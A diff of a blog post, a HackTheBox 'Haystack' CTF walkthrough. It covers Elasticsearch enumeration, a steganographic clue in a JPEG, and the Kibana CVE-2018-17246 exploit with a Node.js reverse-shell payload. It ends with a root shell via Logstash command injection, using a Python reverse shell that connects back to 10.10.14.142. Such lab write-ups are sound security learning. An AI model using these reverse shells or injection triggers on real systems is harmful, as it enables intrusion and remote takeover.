@@ -8,6 +8,7 @@ toc_sticky: true
 ---
 ## Scans
 
+{% highlight plain_text %}
 Starting Nmap 7.80 ( <https://nmap.org> ) at 2019-10-01 09:16 EDT  
 Nmap scan report for 10.10.10.115  
 Host is up, received user-set (0.24s latency).
@@ -31,7 +32,7 @@ Aggressive OS guesses: Linux 3.10 &#8211; 4.11 (91%), Linux 3.12 (91%), Linux 3.
 (91%), Linux 3.2 &#8211; 4.9 (91%), Linux 3.8 &#8211; 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 3.16 (90%)
 
 NMAP shows an SSH server, and two HTTP servers. The interesting thing is the HTTP server on port 9200 has the DELETE method available.
-
+{% endhighlight %}
 &nbsp;
 
 ## Website Investigations
@@ -56,7 +57,8 @@ I didn&#8217;t know anything about elasticsearch before this box, so I&#8217;ll 
 
 When trying to use a typical query POST request, I get an error stating that the server doesn&#8217;t support POST.
 
-<pre class="toolbar:2 striped:false lang:zsh decode:true">root@kali /root                                                       
+{% highlight json %}
+root@kali /root                                                       
 ⚡ curl -XPOST "http://10.10.10.115:9200" -d'
 {               
   "query":{
@@ -64,13 +66,15 @@ When trying to use a typical query POST request, I get an error stating that the
   }
 }
 '
-{"error":"Incorrect HTTP method for uri [/] and method [POST], allowed: [HEAD, DELETE, GET]","status":405}#</pre>
+{"error":"Incorrect HTTP method for uri [/] and method [POST], allowed: [HEAD, DELETE, GET]","status":405}#
+{% endhighlight %}
 
 And that&#8217;s because I wasn&#8217;t using it correctly, since I didn&#8217;t know what I was doing.
 
 Here&#8217;s a request that returns something.
 
-<pre class="toolbar:2 striped:false lang:zsh decode:true ">root@kali /root                                                                                                            
+{% highlight json %}
+root@kali /root                                                                                                            
 ⚡ curl -XPOST "http://10.10.10.115:9200/_search/"                                                                         
 {"took":3,"timed_out":false,"_shards":{"total":11,"successful":11,"skipped":0,"failed":0},"hits":{"total":1254,"max_score":
 1.0,"hits":[{"_index":".kibana","_type":"doc","_id":"config:6.4.2","_score":1.0,"_source":{"type":"config","updated_at":"20
@@ -96,255 +100,265 @@ alance":3150,"firstname":"Blake","lastname":"Davidson","age":30,"gender":"F","ad
 ntasis","email":"blakedavidson@quantasis.com","city":"Crumpler","state":"KY"}},{"_index":"bank","_type":"account","_id":"20
 8","_score":1.0,"_source":{"account_number":208,"balance":40760,"firstname":"Garcia","lastname":"Hess","age":26,"gender":"F
 ","address":"810 Nostrand Avenue","employer":"Quiltigen","email":"garciahess@quiltigen.com","city":"Brooktrails","state":"G
-A"}}]}}#</pre>
+A"}}]}}
+{% endhighlight %}
 
 And here is the formatted JSON:
 
-<pre class="toolbar:2 striped:false lang:xhtml decode:true ">{
-	"took": 3,
-	"timed_out": false,
-	"_shards": {
-		"total": 11,
-		"successful": 11,
-		"skipped": 0,
-		"failed": 0
-	},
-	"hits": {
-		"total": 1254,
-		"max_score": 1.0,
-		"hits": [
-			{
-				"_index": ".kibana",
-				"_type": "doc",
-				"_id": "config:6.4.2",
-				"_score": 1.0,
-				"_source": {
-					"type": "config",
-					"updated_at": "2019-01-23T18:15:53.396Z",
-					"config": {
-						"buildNum": 18010,
-						"telemetry:optIn": false
-					}
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "25",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 25,
-					"balance": 40540,
-					"firstname": "Virginia",
-					"lastname": "Ayala",
-					"age": 39,
-					"gender": "F",
-					"address": "171 Putnam Avenue",
-					"employer": "Filodyne",
-					"email": "virginiaayala@filodyne.com",
-					"city": "Nicholson",
-					"state": "PA"
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "44",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 44,
-					"balance": 34487,
-					"firstname": "Aurelia",
-					"lastname": "Harding",
-					"age": 37,
-					"gender": "M",
-					"address": "502 Baycliff Terrace",
-					"employer": "Orbalix",
-					"email": "aureliaharding@orbalix.com",
-					"city": "Yardville",
-					"state": "DE"
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "99",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 99,
-					"balance": 47159,
-					"firstname": "Ratliff",
-					"lastname": "Heath",
-					"age": 39,
-					"gender": "F",
-					"address": "806 Rockwell Place",
-					"employer": "Zappix",
-					"email": "ratliffheath@zappix.com",
-					"city": "Shaft",
-					"state": "ND"
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "119",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 119,
-					"balance": 49222,
-					"firstname": "Laverne",
-					"lastname": "Johnson",
-					"age": 28,
-					"gender": "F",
-					"address": "302 Howard Place",
-					"employer": "Senmei",
-					"email": "lavernejohnson@senmei.com",
-					"city": "Herlong",
-					"state": "DC"
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "126",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 126,
-					"balance": 3607,
-					"firstname": "Effie",
-					"lastname": "Gates",
-					"age": 39,
-					"gender": "F",
-					"address": "620 National Drive",
-					"employer": "Digitalus",
-					"email": "effiegates@digitalus.com",
-					"city": "Blodgett",
-					"state": "MD"
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "145",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 145,
-					"balance": 47406,
-					"firstname": "Rowena",
-					"lastname": "Wilkinson",
-					"age": 32,
-					"gender": "M",
-					"address": "891 Elton Street",
-					"employer": "Asimiline",
-					"email": "rowenawilkinson@asimiline.com",
-					"city": "Ripley",
-					"state": "NH"
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "183",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 183,
-					"balance": 14223,
-					"firstname": "Hudson",
-					"lastname": "English",
-					"age": 26,
-					"gender": "F",
-					"address": "823 Herkimer Place",
-					"employer": "Xinware",
-					"email": "hudsonenglish@xinware.com",
-					"city": "Robbins",
-					"state": "ND"
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "190",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 190,
-					"balance": 3150,
-					"firstname": "Blake",
-					"lastname": "Davidson",
-					"age": 30,
-					"gender": "F",
-					"address": "636 Diamond Street",
-					"employer": "Quantasis",
-					"email": "blakedavidson@quantasis.com",
-					"city": "Crumpler",
-					"state": "KY"
-				}
-			},
-			{
-				"_index": "bank",
-				"_type": "account",
-				"_id": "208",
-				"_score": 1.0,
-				"_source": {
-					"account_number": 208,
-					"balance": 40760,
-					"firstname": "Garcia",
-					"lastname": "Hess",
-					"age": 26,
-					"gender": "F",
-					"address": "810 Nostrand Avenue",
-					"employer": "Quiltigen",
-					"email": "garciahess@quiltigen.com",
-					"city": "Brooktrails",
-					"state": "GA"
-				}
-			}
-		]
-	}
-}</pre>
+{% highlight json %}
+{
+  "took": 3,
+  "timed_out": false,
+  "_shards": {
+    "total": 11,
+    "successful": 11,
+    "skipped": 0,
+    "failed": 0
+  },
+  "hits": {
+    "total": 1254,
+    "max_score": 1.0,
+    "hits": [
+      {
+        "_index": ".kibana",
+        "_type": "doc",
+        "_id": "config:6.4.2",
+        "_score": 1.0,
+        "_source": {
+          "type": "config",
+          "updated_at": "2019-01-23T18:15:53.396Z",
+          "config": {
+            "buildNum": 18010,
+            "telemetry:optIn": false
+          }
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "25",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 25,
+          "balance": 40540,
+          "firstname": "Virginia",
+          "lastname": "Ayala",
+          "age": 39,
+          "gender": "F",
+          "address": "171 Putnam Avenue",
+          "employer": "Filodyne",
+          "email": "virginiaayala@filodyne.com",
+          "city": "Nicholson",
+          "state": "PA"
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "44",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 44,
+          "balance": 34487,
+          "firstname": "Aurelia",
+          "lastname": "Harding",
+          "age": 37,
+          "gender": "M",
+          "address": "502 Baycliff Terrace",
+          "employer": "Orbalix",
+          "email": "aureliaharding@orbalix.com",
+          "city": "Yardville",
+          "state": "DE"
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "99",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 99,
+          "balance": 47159,
+          "firstname": "Ratliff",
+          "lastname": "Heath",
+          "age": 39,
+          "gender": "F",
+          "address": "806 Rockwell Place",
+          "employer": "Zappix",
+          "email": "ratliffheath@zappix.com",
+          "city": "Shaft",
+          "state": "ND"
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "119",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 119,
+          "balance": 49222,
+          "firstname": "Laverne",
+          "lastname": "Johnson",
+          "age": 28,
+          "gender": "F",
+          "address": "302 Howard Place",
+          "employer": "Senmei",
+          "email": "lavernejohnson@senmei.com",
+          "city": "Herlong",
+          "state": "DC"
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "126",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 126,
+          "balance": 3607,
+          "firstname": "Effie",
+          "lastname": "Gates",
+          "age": 39,
+          "gender": "F",
+          "address": "620 National Drive",
+          "employer": "Digitalus",
+          "email": "effiegates@digitalus.com",
+          "city": "Blodgett",
+          "state": "MD"
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "145",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 145,
+          "balance": 47406,
+          "firstname": "Rowena",
+          "lastname": "Wilkinson",
+          "age": 32,
+          "gender": "M",
+          "address": "891 Elton Street",
+          "employer": "Asimiline",
+          "email": "rowenawilkinson@asimiline.com",
+          "city": "Ripley",
+          "state": "NH"
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "183",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 183,
+          "balance": 14223,
+          "firstname": "Hudson",
+          "lastname": "English",
+          "age": 26,
+          "gender": "F",
+          "address": "823 Herkimer Place",
+          "employer": "Xinware",
+          "email": "hudsonenglish@xinware.com",
+          "city": "Robbins",
+          "state": "ND"
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "190",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 190,
+          "balance": 3150,
+          "firstname": "Blake",
+          "lastname": "Davidson",
+          "age": 30,
+          "gender": "F",
+          "address": "636 Diamond Street",
+          "employer": "Quantasis",
+          "email": "blakedavidson@quantasis.com",
+          "city": "Crumpler",
+          "state": "KY"
+        }
+      },
+      {
+        "_index": "bank",
+        "_type": "account",
+        "_id": "208",
+        "_score": 1.0,
+        "_source": {
+          "account_number": 208,
+          "balance": 40760,
+          "firstname": "Garcia",
+          "lastname": "Hess",
+          "age": 26,
+          "gender": "F",
+          "address": "810 Nostrand Avenue",
+          "employer": "Quiltigen",
+          "email": "garciahess@quiltigen.com",
+          "city": "Brooktrails",
+          "state": "GA"
+        }
+      }
+    ]
+  }
+}
+{% endhighlight %}
 
-Using <span class="lang:zsh decode:true crayon-inline ">curl -XGET &#8220;10.10.10.115:9200/bank/&#8221;</span> will show the format of the &#8220;bank&#8221; index. And we can do the same for &#8220;.kibana&#8221;, which might be a little more interesting. But honestly, I didn&#8217;t see anything in either which was really useful unless you&#8217;re a spammer just collecting email addresses. If we knew what ALL the indexes are, then maybe we could find something better.
+Using `curl -XGET "10.10.10.115:9200/bank/"` will show the format of the &#8220;bank&#8221; index. And we can do the same for &#8220;.kibana&#8221;, which might be a little more interesting. But honestly, I didn&#8217;t see anything in either which was really useful unless you&#8217;re a spammer just collecting email addresses. If we knew what ALL the indexes are, then maybe we could find something better.
 
-Use <span class="toolbar:2 striped:false lang:zsh decode:true crayon-inline ">curl -XGET &#8220;10.10.10.115:9200/_cat/indices?v&#8221;</span> to find out what the indexes are:
+Use `curl -XGET "10.10.10.115:9200/_cat/indices?v"` to find out what the indexes are:
 
-<pre class="toolbar:2 striped:false lang:zsh decode:true">root@kali /root/htb/haystack                                                                                               
+{% highlight plain_text %}
+root@kali /root/htb/haystack                                                                                               
 ⚡ curl -XGET "10.10.10.115:9200/_cat/indices?v"
 health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
 green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
 yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
-yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb</pre>
+yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
+{% endhighlight %}
 
-And you can get the structure of them all by using <span class="lang:zsh decode:true crayon-inline">curl -XGET &#8220;10.10.10.115:9200/*/&#8221;</span> .
+And you can get the structure of them all by using `curl -XGET "10.10.10.115:9200/*/"` .
 
-After playing with submitting queries, my favorite way to submit them is on the URI like&#8230; <span class="lang:zsh decode:true crayon-inline">curl -XGET &#8220;10.10.10.115:9200/bank/_search/?pretty=true&q=web*&#8221;</span> &#8230; where the &#8220;q=&#8221; is the search string.
+After playing with submitting queries, my favorite way to submit them is on the URI like&#8230; `curl -XGET "10.10.10.115:9200/bank/_search/?pretty=true&q=web*"` &#8230; where the &#8220;q=&#8221; is the search string.
 
 While searching around in the data, I found this bit of encouragement to know I&#8217;m on the right track:
 
-<pre class="lang:zsh decode:true ">root@kali /root/htb/haystack                                                                                               
+{% highlight plain_text %}
+root@kali /root/htb/haystack                                                                                               
 ⚡ curl -XGET "10.10.10.115:9200/quotes/quote/2/_source?pretty=true"
 {
   "quote" : "There's a needle in this haystack, you have to search for it"
-}</pre>
+}
+{% endhighlight %}
 
-After a while of trying different searches like <span class="lang:zsh decode:true crayon-inline ">curl -XGET &#8220;10.10.10.115:9200/_search?pretty=true&q=needle&#8221;</span> and getting nowhere fast, I decided to reassess where I was at in the challenge. Normally when I&#8217;m stuck that&#8217;s because I&#8217;m overlooking something that I should have paid closer attention to. Along with the help of a hint from a forum post that said the picture wasn&#8217;t actually useless, I was able to find another clue.
+After a while of trying different searches like `curl -XGET “10.10.10.115:9200/_search?pretty=true&q=needle”` and getting nowhere fast, I decided to reassess where I was at in the challenge. Normally when I&#8217;m stuck that&#8217;s because I&#8217;m overlooking something that I should have paid closer attention to. Along with the help of a hint from a forum post that said the picture wasn&#8217;t actually useless, I was able to find another clue.
 
 I downloaded the image of the needle from the port 80 website, and ran a &#8220;file&#8221; check on it to see if anything odd stood out.
 
-<pre class="lang:zsh decode:true ">root@kali /root/Downloads                           
+{% highlight plain_text %}
+root@kali /root/Downloads                           
 ⚡ file needle.jpg                                
 needle.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, Exif Standard: [TIFF i
 mage data, big-endian, direntries=5, xresolution=74, yresolution=82, resolutionunit=2, software=paint.net 4.1.1], baseline,
- precision 8, 1200x803, components 3</pre>
+ precision 8, 1200x803, components 3
+ {% endhighlight %}
 
 Nothing out of the ordinary there, so then I printed out the data with &#8220;cat&#8221;, hoping there might be a hidden string in the padding at the end of the file. That&#8217;s a pretty common stegonography trick with JPEG files. Sure enough there was! It was a base64 encoded string. So I extracted it and decoded it:
 
-<pre class="lang:zsh decode:true">root@kali /root/Downloads                                                                                                  
+{% highlight plain_text %}
+root@kali /root/Downloads                                                                                                  
 ⚡ cat needle.jpg | tail -c 45 | base64 -d
 la aguja en el pajar es "clave"                                                                                           
-</pre>
+{% endhighlight %}
 
 Google Translate tells me this is Spanish for:
 
-<pre class="tw-data-text tw-text-large tw-ta" data-placeholder="Translation" id="tw-target-text"><span lang="en" tabindex="0">the needle in the haystack is "key"</span></pre>
+`the needle in the haystack is "key"`
 
 Great! We can search for that and hopefully get somewhere&#8230;
 
@@ -366,22 +380,26 @@ Looking at the process list shows that there are some processes running under th
 
 Earlier when we tried to attack kibana it said we were barking up the wrong tree&#8230;
 
-<pre class="lang:zsh decode:true">[security@haystack ~]$ curl "localhost:9200/api/console/api_server?"
+{% highlight plain_text %}
+[security@haystack ~]$ curl "localhost:9200/api/console/api_server?"
 {"error":{"root_cause":[{"type":"index_not_found_exception","reason":"no such index","resource.type":"index_expression","resource.id":"api","index_uuid":"_na_","index":"api"}],"type":"index_not_found_exception","reason":"no such index","resource.type":"index_expression","resource.id":"api","index_uuid":"_na_","index":"api"},"status":404}[security@haystack ~]$ 
-</pre>
+{% endhighlight %}
 
 &#8230;but if the same query is used against the local interface for kibana, we get a different kind of result:
 
-<pre class="lang:zsh decode:true">[security@haystack ~]$ curl "localhost:5601/api/console/api_server?"
-{"statusCode":400,"error":"Bad Request","message":"\"apis\" is a required param."}[security@haystack ~]$</pre>
+{% highlight plain_text %}[security@haystack ~]$ curl "localhost:5601/api/console/api_server?"
+{"statusCode":400,"error":"Bad Request","message":"\"apis\" is a required param."}[security@haystack ~]$
+{% endhighlight %}
 
 &#8230;suggesting we may be able to use the exploit afterall.
 
-At first I tried to run the [exploit code](https://github.com/mpgn/CVE-2018-17246) from within the ssh session, but got no results. Then I looked at the forum for just a page or two and there were several hints that seemed to suggest setting up an SSH tunnel to access the 5601 port remotely. So I read up on some [tutorials](https://hackernoon.com/the-ssh-black-magic-for-data-science-acd6f65e8528) for SSH Tunneling since it is kinda confusing. I got the tunnel built with <span class="lang:zsh decode:true crayon-inline">ssh -L 5601:localhost:5601 security@10.10.10.115</span> and proved the connection worked by sending one of the previous commands from my box:
+At first I tried to run the [exploit code](https://github.com/mpgn/CVE-2018-17246) from within the ssh session, but got no results. Then I looked at the forum for just a page or two and there were several hints that seemed to suggest setting up an SSH tunnel to access the 5601 port remotely. So I read up on some [tutorials](https://hackernoon.com/the-ssh-black-magic-for-data-science-acd6f65e8528) for SSH Tunneling since it is kinda confusing. I got the tunnel built with `ssh -L 5601:localhost:5601 security@10.10.10.115` and proved the connection worked by sending one of the previous commands from my box:
 
-<pre class="lang:zsh decode:true">root@kali /root/Downloads                            
+{% highlight plain_text %}
+root@kali /root/Downloads                            
 ⚡ curl -XGET "localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis="
-{"statusCode":400,"error":"Bad Request","message":"\"apis\" is a required param."}</pre>
+{"statusCode":400,"error":"Bad Request","message":"\"apis\" is a required param."}
+{% endhighlight %}
 
 At that point we can even open the Kibana app in the browser.  
 [<img class="alignnone wp-image-363 size-large" src="/assets/uploads/2019/10/2019-10-03_10h34_08-1024x422.png" alt="" width="640" height="264" srcset="/assets/uploads/2019/10/2019-10-03_10h34_08-1024x422.png 1024w, /assets/uploads/2019/10/2019-10-03_10h34_08-300x124.png 300w, /assets/uploads/2019/10/2019-10-03_10h34_08-768x316.png 768w, /assets/uploads/2019/10/2019-10-03_10h34_08.png 1095w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/10/2019-10-03_10h34_08.png)
@@ -394,7 +412,8 @@ The above screenshot shows a tunnel connection where I created the [payload](htt
 
 The kibana payload file:
 
-<pre class="lang:js decode:true">(function(){
+{% highlight javascript %}
+(function(){
     var net = require("net"),
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
@@ -405,7 +424,8 @@ The kibana payload file:
         sh.stderr.pipe(client);
     });
     return /a/; // Prevents the Node.js application form crashing
-})();</pre>
+})();
+{% endhighlight %}
 
 One caveat about the exploit though, if the reverse shell breaks, you may need to rename the payload file before sending the exploit again.
 
@@ -424,7 +444,8 @@ Anyway, we can search for files we have access to with <span class="lang:zsh dec
 
 There were a few files that seemed interesting:
 
-<pre class="lang:zsh decode:true">[kibana@haystack conf.d]$  ls
+{% highlight plain_text %}
+[kibana@haystack conf.d]$  ls
 filter.conf  input.conf  output.conf
 [kibana@haystack conf.d]$  cat filter.conf
 filter {
@@ -436,25 +457,25 @@ filter {
 }
 [kibana@haystack conf.d]$  cat input.conf
 input {
-        file {
-                path =&gt; "/opt/kibana/logstash_*"
-                start_position =&gt; "beginning"
-                sincedb_path =&gt; "/dev/null"
-                stat_interval =&gt; "10 second"
-                type =&gt; "execute"
-                mode =&gt; "read"
-        }
+    file {
+        path =&gt; "/opt/kibana/logstash_*"
+        start_position =&gt; "beginning"
+        sincedb_path =&gt; "/dev/null"
+        stat_interval =&gt; "10 second"
+        type =&gt; "execute"
+        mode =&gt; "read"
+    }
 }
-[kibana@haystack conf.d]$  cat output.conf
+[kibana@haystack conf.d]$ cat output.conf
 output {
-        if [type] == "execute" {
-                stdout { codec =&gt; json }
-                exec {
-                        command =&gt; "%{comando} &"
-                }
+    if [type] == "execute" {
+        stdout { codec =&gt; json }
+        exec {
+            command =&gt; "%{comando} &"
         }
+    }
 }
-</pre>
+{% endhighlight %}
 
 It looks like there could be command injection (type == &#8220;execute&#8221;) in the output.conf and filter.conf codes.
 
@@ -471,14 +492,17 @@ Writing &#8220;Ejecutar comando: echo test&#8221; should fit the grok filter{} b
 
 Looking at the process list we can see the logstash process is running as root, so if we it can connect out to a reverse shell, we&#8217;ll get root!
 
-<pre class="lang:zsh decode:true">[security@haystack tmp]$ ps -aux |grep logstash
+{% highlight plain_text %}
+[security@haystack tmp]$ ps -aux |grep logstash
 root       6194  1.1 13.3 2738240 515912 ?      SNsl 07:20   3:54 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash
 kibana    17764  0.0  0.1 151424  5000 pts/5    S+   10:31   0:00 vim logstash_1
-security  18412  0.0  0.0 112708   976 pts/0    R+   13:04   0:00 grep --color=auto logstash</pre>
+security  18412  0.0  0.0 112708   976 pts/0    R+   13:04   0:00 grep --color=auto logstash
+{% endhighlight %}
 
 There&#8217;s multiple ways to do it, but creating a python script for the reverse shell and calling the script with the Grok command should work. My reverse shell script:
 
-<pre class="lang:python decode:true">#!/usr/bin/python
+{% highlight python %}
+#!/usr/bin/python
 import socket,subprocess,os
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -486,11 +510,14 @@ s.connect(("10.10.14.142",1338))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"]);</pre>
+p=subprocess.call(["/bin/sh","-i"]);
+{% endhighlight %}
 
 And the Grok command to send:
 
-<pre class="lang:zsh highlight:0 decode:true">Ejecutar comando: /tmp/rshell.py</pre>
+{% highlight plain_text %}
+Ejecutar comando: /tmp/rshell.py
+{% endhighlight %}
 
 And it&#8217;ll take a little while for the logstash routine to run the payload, but it does eventually work!
 
